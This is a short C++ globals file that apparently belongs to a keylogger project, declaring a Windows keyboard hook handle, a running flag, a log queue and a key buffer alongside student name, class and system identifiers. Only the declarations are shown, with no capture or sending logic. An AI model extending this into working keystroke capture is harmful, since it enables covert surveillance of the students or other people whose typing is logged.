#include "globals.h"

HHOOK hKeyHook = NULL;
bool isKeyloggerRunning = false; // Set default ke false
std::queue<std::string> logQueue;
std::mutex queueMutex;
std::condition_variable cv;

std::string SYSTEM_ID;
std::string STUDENT_NAME;
std::string STUDENT_CLASS;
std::string keyBuffer;
std::mutex keyMutex;